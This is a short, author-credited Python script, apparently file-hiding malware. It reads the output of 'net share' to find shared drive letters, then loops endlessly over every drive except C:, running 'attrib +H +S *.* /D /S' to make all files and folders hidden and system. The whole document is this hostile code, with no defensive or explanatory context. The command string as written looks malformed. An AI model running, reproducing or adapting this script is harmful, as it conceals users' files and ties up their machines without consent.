''' MEHRDAD MOGHADAM '''

import subprocess as Sub

sys_drive = []
drive = ["A:" , "B:" , "C:" , "D:" , "F:" , "H:" , "E:" , "G:"]
cmd = Sub.check_output("net share" , shell=True).decode()

for i in drive :
    if i in str(cmd) :
        sys_drive.append(i)
        
while True:
    for i in sys_drive :
        if i == "C:" :
            continue
        else :
            cmd = Sub.check_output(str(i) + "attrib +H +S *.* /D /S" , shell=True)
